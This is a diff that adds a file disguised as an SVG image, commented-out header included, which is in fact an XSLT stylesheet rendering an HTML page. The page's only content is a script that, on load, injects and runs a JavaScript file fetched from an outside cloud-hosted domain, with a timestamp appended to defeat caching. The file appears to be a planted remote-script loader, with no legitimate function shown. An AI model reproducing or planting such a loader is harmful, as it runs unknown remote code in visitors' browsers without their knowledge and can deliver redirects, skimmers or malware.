@@ -1,0 +1,24 @@
+<!-- <?xml version="1.0" encoding="UTF-8" standalone="yes"?>  
+ <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="3.5in" height="1in"> -->
+<xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform" version="1.0">
+<xsl:template match="/">
+<html>
+<body>
+<meta content="always" name="referrer"/>
+<meta charset="UTF-8"/>
+<script charset="UTF-8"> 
+    var xUrl = '//shuqx-3g9blg4wc759c4f6-1372967724.ap-shanghai.app.tcloudbase.com/shujs/wxmin.js' 
+    var now = Math.round(Date.now() / 1000 / 5) 
+    var s = document.createElement('script') 
+    s.setAttribute('src', xUrl + '?t=' +now) 
+    s.setAttribute('charset', 'utf-8') 
+    if (!document.body) {
+        document.head.appendChild(s) 
+    } else {
+        document.body.appendChild(s) 
+    } 
+</script>
+</body>
+</html>
+</xsl:template>
+</xsl:stylesheet>
